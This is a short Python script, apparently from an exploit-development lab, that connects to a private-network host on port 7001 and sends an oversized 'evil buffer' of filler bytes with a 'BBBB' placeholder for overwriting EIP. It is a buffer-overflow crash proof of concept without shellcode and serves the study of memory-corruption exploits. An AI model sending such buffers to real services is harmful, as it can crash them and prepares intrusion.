#!/usr/bin/python
import socket

try:
    print("\nSending evil buffer...")

    filler = "A" * 2288
    eip    = "B" * 4        # BBBB = 0x42424242
    offset = "C" * 16
    buffer = "D" * 1600

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.193.10", 7001))
    s.send(filler + eip + offset + buffer)

    s.close()

    print("\nDone!")

except:
    print("\nCould not connect!")
